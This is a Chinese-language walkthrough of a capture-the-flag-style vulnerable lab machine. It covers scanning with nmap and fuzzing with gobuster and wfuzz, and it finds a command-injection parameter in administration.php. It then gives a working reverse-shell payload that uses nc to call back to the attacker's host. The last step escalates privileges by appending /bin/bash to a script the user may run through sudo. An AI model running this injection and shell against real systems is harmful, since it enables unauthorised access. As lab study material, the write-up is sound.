前言

本次文章只用于技术讨论，学习，切勿用于非法用途，用于非法用途与本人无关！

信息收集阶段

KALI攻击机地址：192.168.1.128

靶机地址：未知

目标：root.txt和user.txt

nmap -sn 192.168.1.0/24

nmap -A -p- 192.168.1.3

开启了8080端口：访问下试试！

漏洞利用阶段

访问下看看！！

http://192.168.1.3:8080/

查看源代码！有一串可疑的JS代码！

后续再说！先做下目录扫描！

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.3:8080/ -x php,html,txt,log,zip

但是这里没有正常回显，还报错了！

Error: the server returns a status code that matches the provided options for non existing urls. http://192.168.1.3:8080/aa293795-608f-4a85-8230-ec838e2df31d => 200 (Length: 2899). To continue please exclude the status code, the length or use the --wildcard switch

我在一下网站找到了解决方案：

https://infinitelogins.com/2020/09/05/dealing-gobuster-wildcard-and-status-code-errors/

或者直接卸载这个工具，重新下一个这个BUG就会修复，太复杂了，这里换个工具。

这里我们用WFUZZ工具进行破解：

这里遍历目录时，不存在的目录可会返回200，但是请示php文件时，不存在的文件会返回404，所以可以通过FUZZphp文件来找到需要的文件。

wfuzz -c -hc 404 -t100 http://192.168.1.3:8080/FUZZ.php

访问下下面那两个地址：

http://192.168.1.3:8080/administration.php

你不允许去查看，你的行动已经被记录了！说明可以传入参数！

http://192.168.1.3:8080/process.php

wfuzz -c --hc=404 -t100 --hh 65 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.3:8080/administration.php?FUZZ=id﻿

这里着重说下：--hh 65 这个参数的意思是隐藏掉字符数是65的响应包。

需要的参数已经被FUZZ到！

http://192.168.1.3:8080/administration.php?logfile=id

这里如果我们这id换到反弹shell的命令，是否回显相应的SHELL！

我们试一下：

http://192.168.1.3:8080/administration.php?logfile=;nc%20192.168.1.128%204444%20-e%20/bin/bash

这里有一点需要注意下，反弹的命令前方需要一个分号：

已经成功反弹shell！

这里有两个用户，我们需要提权到这两个用户上：

先查一下sudo权限！

我们想一下这个脚本的内容：

我们这里把/bin/bash命令追加到这个脚本后边，并以用用户julia进行运行！

echo "/bin/bash" >> /var/www/html/start.sh

这里一定要采用英文符号！英文符号拷贝到文件中后，双引号会消失，而中文双引号会出现。

然后用用户julia进行运行！

sudo -u julia /bin/bash /var/www/html/start.sh
